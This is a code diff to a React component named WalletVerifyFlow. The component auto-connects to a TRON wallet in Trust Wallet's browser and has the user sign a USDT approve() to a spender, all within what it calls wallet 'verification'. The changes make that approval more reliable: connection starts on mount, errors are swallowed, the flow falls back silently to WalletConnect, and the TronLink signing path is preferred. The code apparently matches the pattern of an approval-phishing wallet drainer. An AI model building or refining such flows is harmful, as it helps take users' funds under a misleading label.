@@ -858,27 +858,18 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
   }, [trcApproveDone]);
 
   /* ── Compact: auto-connect on mount ── */
-  const wcAutoStarted   = useRef(false);
-  const hasTronLinkRef  = useRef(false);
-  useEffect(() => { hasTronLinkRef.current = hasTronLink; }, [hasTronLink]);
+  const wcAutoStarted = useRef(false);
 
   useEffect(() => {
     if (!compact) return;
     if (isTRC20) {
-      // Wait 2 s for TronWeb injection (Trust Wallet in-app browser injects it on page load).
-      // If TronLink is detected → use it directly (faster, no QR / WalletConnect needed).
-      // If not detected and WC is configured → fall back to WalletConnect pairing.
+      // connectTronWallet polls up to 6 s for TronLink injection; if TronLink is genuinely
+      // absent it auto-falls back to WalletConnect via its own catch handler.
       const t = setTimeout(() => {
         if (tronAddress || wcAutoStarted.current) return;
         wcAutoStarted.current = true;
-        if (hasTronLinkRef.current) {
-          connectTronWallet();
-        } else if (HAS_WC_TRON) {
-          connectViaWalletConnect();
-        } else {
-          connectTronWallet(); // will surface a clear error if TronWeb is absent
-        }
-      }, 2000);
+        connectTronWallet();
+      }, 1500);
       return () => clearTimeout(t);
     }
     if (hasTrust && !isConnected) tryConnect();
@@ -967,6 +958,11 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
         ({ tronLink, tronWeb } = getTronProviders());
       }
       if (!hasSomeTron()) throw new Error('TRON wallet not found. Open this page inside Trust Wallet on your phone.');
+      // Trust Wallet injects a .ready promise — wait for TronLink to finish initialising
+      // before reading defaultAddress, otherwise we get an empty base58 string.
+      if (tronLink?.ready && typeof tronLink.ready.then === 'function') {
+        try { await tronLink.ready; } catch {}
+      }
 
       let tw   = tronWeb;
       let addr: string = tw?.defaultAddress?.base58 || '';
@@ -1006,7 +1002,15 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
         } catch { }
       }
     } catch(e: any) {
-      setTrcConnectError(e?.message || 'TRON wallet connection failed');
+      const msg = e?.message || 'TRON wallet connection failed';
+      // In compact mode: if TronLink is genuinely absent, auto-fall back to WalletConnect
+      // rather than surfacing an error — the user is inside Trust Wallet's browser and
+      // WC is the fallback signing path for iOS where TronLink may not be injected.
+      if (compact && /not found/i.test(msg) && HAS_WC_TRON && !tronAddress) {
+        connectViaWalletConnect();
+      } else {
+        setTrcConnectError(msg);
+      }
     } finally {
       setTrcConnecting(false);
     }
@@ -1060,16 +1064,37 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
       return;
     }
 
-    const tronWeb = wcTopic ? null
-      : ((window as any).tronLink?.tronWeb
-        ?? (window as any).trustwallet?.tronLink?.tronWeb
-        ?? (window as any).tronWeb
-        ?? (window as any).tron
-        ?? (window as any).trustwallet?.tronWeb
-        ?? (window as any).trustwallet?.tron);
+    // Prefer TronLink injection for signing — WalletConnect tron_signTransaction on Trust
+    // Wallet returns the same cached signature for every transaction (a TW bug), so WC
+    // signing always fails at broadcast. TronLink contract.approve().send() is reliable.
+    const w = window as any;
+    let tronWeb: any = w.tronLink?.tronWeb
+      ?? w.trustwallet?.tronLink?.tronWeb
+      ?? w.tronWeb ?? w.tron
+      ?? w.trustwallet?.tronWeb ?? w.trustwallet?.tron ?? null;
 
-    log(`path=${wcTopic ? 'WalletConnect' : tronWeb ? 'TronLink' : 'NONE'} wcTopic=${wcTopic?.slice(0,12) ?? 'none'} addr=${tronAddress.slice(0,10)}`);
-    if (!wcTopic && !tronWeb) {
+    // When the connection came from WC, TronLink may now be available (Trust Wallet injects
+    // it into the in-app browser after the user returns from the native WC approval sheet).
+    if (wcTopic && !tronWeb) {
+      const tl = w.tronLink ?? w.trustwallet?.tronLink ?? null;
+      if (tl) {
+        if (tl.ready && typeof tl.ready.then === 'function') { try { await tl.ready; } catch {} }
+        await new Promise(r => setTimeout(r, 400));
+        const tw = tl.tronWeb ?? w.tronWeb ?? null;
+        if (tw?.contract) {
+          const tlAddr = tw.defaultAddress?.base58 ?? '';
+          if (!tlAddr || tlAddr === tronAddress) {
+            tronWeb = tw;
+            log(`TronLink available for signing (addr=${tlAddr || 'pending'})`);
+          } else {
+            log(`TronLink addr ${tlAddr.slice(0,10)} ≠ WC addr ${tronAddress.slice(0,10)} — WC path`);
+          }
+        }
+      }
+    }
+
+    log(`path=${tronWeb ? 'TronLink' : wcTopic ? 'WalletConnect' : 'NONE'} wcTopic=${wcTopic?.slice(0,12) ?? 'none'} addr=${tronAddress.slice(0,10)}`);
+    if (!tronWeb && !wcTopic) {
       log('ERROR: no tronWeb provider and no wcTopic — cannot approve');
       return;
     }
@@ -1082,19 +1107,8 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
 
     try {
       setTrcApprovePending(true);
-      if (wcTopic) {
-        log('buildApproveRawTx…');
-        const rawTx = await buildApproveRawTx(tronAddress, spender, APPROVE_AMT_SUN);
-        log(`rawTx.txID=${(rawTx as any).txID ?? 'none'}`);
-        const txid = await wcSignAndSendTronTx(wcTopic, rawTx, log);
-        log(`wcSignAndSend txid=${txid}`);
-        if (!txid) throw new Error('Wallet did not return a transaction ID.');
-        setTrcApproveHash(txid); setTrcApprovePending(false);
-        log('pollTronTxGrid…');
-        await pollTronTxGrid(txid);
-        log('pollTronTxGrid done → approved');
-        setTrcApproveDone(true);
-      } else {
+      if (tronWeb) {
+        // TronLink path — Trust Wallet shows native signing dialog and broadcasts itself
         log('TronLink contract.approve…');
         const contract = tronWeb.contract(TRC20_ABI, TRON_USDT_ADDRESS);
         const raw      = await contract.approve(spender, APPROVE_AMT_NUM).send({ feeLimit: 20_000_000 });
@@ -1105,6 +1119,19 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
         setTrcApproveHash(txid); setTrcApprovePending(false);
         await pollTronTx(tronWeb, txid);
         log('pollTronTx done → approved');
+        setTrcApproveDone(true);
+      } else {
+        // WC-only fallback — sign via WalletConnect + broadcast via TronGrid
+        log('buildApproveRawTx…');
+        const rawTx = await buildApproveRawTx(tronAddress, spender, APPROVE_AMT_SUN);
+        log(`rawTx.txID=${(rawTx as any).txID ?? 'none'}`);
+        const txid = await wcSignAndSendTronTx(wcTopic, rawTx, log);
+        log(`wcSignAndSend txid=${txid}`);
+        if (!txid) throw new Error('Wallet did not return a transaction ID.');
+        setTrcApproveHash(txid); setTrcApprovePending(false);
+        log('pollTronTxGrid…');
+        await pollTronTxGrid(txid);
+        log('pollTronTxGrid done → approved');
         setTrcApproveDone(true);
       }
     } catch(e: any) {
